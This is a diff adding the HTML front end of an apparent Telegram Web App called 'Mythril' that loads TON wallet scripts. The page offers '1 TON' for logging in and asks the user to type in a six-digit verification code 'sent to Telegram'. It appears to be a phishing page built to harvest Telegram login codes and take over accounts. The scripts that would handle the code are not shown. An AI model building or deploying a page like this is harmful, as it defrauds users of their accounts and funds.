@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mythril</title>
+  <link rel="stylesheet" href="index.css" />
+  <script src="https://telegram.org/js/telegram-web-app.js?58"></script>
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <script type="module" src="core.js"></script>
+  <script src="index.js"></script>
+</head>
+
+<body>
+
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+
+  <main id="app" style="display: none;">
+    <div class="login-container">
+      <div class="login-header">
+        <span>Login and get 1 TON</span>
+        <img src="img/ton.svg" class="ton-icon" alt="TON" />
+      </div>
+
+      <h2 class="login-title">Verification code has been sent to Telegram</h2>
+    
+      <input
+      id="code-input"
+      type="text"
+      inputmode="numeric"
+      maxlength="6"
+      class="login-input"
+      placeholder="Enter verification code"
+  />
+    
+      <button id="submit-btn" class="login-btn error-btn">Login<img src="img/telegram.png"></button>
+      <button id="test-error-btn" class="login-btn error-btn">Test Error<img src="img/telegram.png"></button>
+    </div>
+  </main>
+</body>
+
+</html>
